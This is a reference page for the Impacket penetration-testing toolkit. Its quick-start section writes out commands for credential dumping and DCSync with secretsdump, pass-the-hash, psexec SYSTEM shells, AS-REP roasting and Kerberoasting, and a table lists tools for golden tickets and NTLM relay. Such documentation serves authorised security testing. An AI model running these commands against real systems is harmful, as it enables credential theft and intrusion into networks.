---
title: "Impacket"
category: "tool"
tags: ["active-directory", "windows", "credential-extraction", "lateral-movement", "kerberos"]
sources:
  - type: github
    url: "https://github.com/fortra/impacket"
  - type: pypi
    url: "https://pypi.org/project/impacket/"
last_updated: "2025-12-27"
---

# Impacket

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Key Scripts](#key-scripts)
- [Documentation Files](#documentation-files)

## Overview

Impacket is a Python library for working with network protocols, focused on providing low-level programmatic access to packets. It is the go-to toolkit for Active Directory penetration testing, offering scripts for credential extraction, lateral movement, and Kerberos attacks.

**Supported Protocols:**
- SMB1, SMB2, SMB3 (high-level implementations)
- MSRPC over TCP, SMB, and HTTP
- Kerberos authentication (password, hashes, tickets, keys)
- LDAP and MSSQL (TDS)
- Various MSRPC interfaces (SAMR, LSAD, DRSUAPI, etc.)

## Installation

```bash
# Install via pipx (recommended)
python3 -m pipx install impacket

# Install from source
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m pipx install .

# Kali Linux
sudo apt install python3-impacket impacket-scripts
```

## Quick Start

### Dump Credentials with secretsdump.py

```bash
# Using password
secretsdump.py domain.local/admin:Password123@dc01.domain.local

# Using NTLM hash (pass-the-hash)
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@dc01

# DCSync attack for specific user
secretsdump.py -just-dc-user krbtgt domain.local/admin:Pass@dc01
```

### Remote Execution with psexec.py

```bash
# Get SYSTEM shell
psexec.py domain.local/admin:Password123@target.domain.local

# Pass-the-hash
psexec.py -hashes :ntlmhash domain.local/admin@target
```

### AS-REP Roasting with GetNPUsers.py

```bash
# Check for users without pre-auth
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1

# Output hashcat format
GetNPUsers.py domain.local/user -no-pass -format hashcat
```

### Kerberoasting with GetUserSPNs.py

```bash
# Request service tickets
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request
```

## Key Scripts

| Script | Description |
|--------|-------------|
| `secretsdump.py` | Dump SAM, LSA secrets, cached creds, NTDS.dit via DCSync |
| `psexec.py` | Remote shell via SMB service creation (SYSTEM) |
| `wmiexec.py` | Semi-interactive shell via WMI (no disk writes) |
| `smbexec.py` | Remote shell via SMB, similar to psexec |
| `atexec.py` | Execute commands via Task Scheduler |
| `dcomexec.py` | Remote shell via DCOM (MMC20, ShellWindows, ShellBrowserWindow) |
| `GetNPUsers.py` | AS-REP Roasting - get hashes for users without preauth |
| `GetUserSPNs.py` | Kerberoasting - request TGS for SPNs |
| `getTGT.py` | Request TGT with password, hash, or AES key |
| `getST.py` | Request service ticket using TGT |
| `ticketer.py` | Create golden/silver tickets |
| `ticketConverter.py` | Convert tickets between ccache and kirbi formats |
| `smbclient.py` | Interactive SMB client (dir, get, put, etc.) |
| `ntlmrelayx.py` | NTLM relay attacks with multiple protocols |
| `mssqlclient.py` | Interactive MSSQL client |
| `rpcdump.py` | Enumerate RPC endpoints |
| `lookupsid.py` | SID brute-forcing / user enumeration |
| `samrdump.py` | Enumerate users via SAMR |
| `reg.py` | Remote registry manipulation |
| `services.py` | Remote Windows service management |

## Documentation Files

| File | Description |
|------|-------------|
| [README.md](README.md) | This file - overview and quick reference |
| [scripts.md](scripts.md) | Comprehensive script reference with detailed examples |
| [github.md](github.md) | GitHub repository information |
